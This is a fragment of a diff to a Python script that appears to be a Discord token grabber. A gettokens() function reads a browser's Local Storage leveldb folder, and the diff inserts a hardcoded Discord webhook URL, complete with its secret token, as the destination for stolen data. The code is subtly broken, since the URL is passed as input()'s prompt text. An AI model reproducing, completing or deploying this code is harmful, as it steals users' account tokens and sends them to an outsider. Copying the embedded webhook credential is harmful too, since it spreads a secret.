@@ -2,7 +2,7 @@ import os
 import re
 import json
 import requests
-userwh = input("Enter your webhook")
+userwh = input("https://discord.com/api/webhooks/1272337671141986375/InqrU65TuNoA8kccOHaBhLftCzC-qSGTwRKUqzDTQbA5-5ctCExOWWXEtGe7hra3cZ29")
 
 def gettokens(path):
     path += "\\Local Storage\\leveldb"
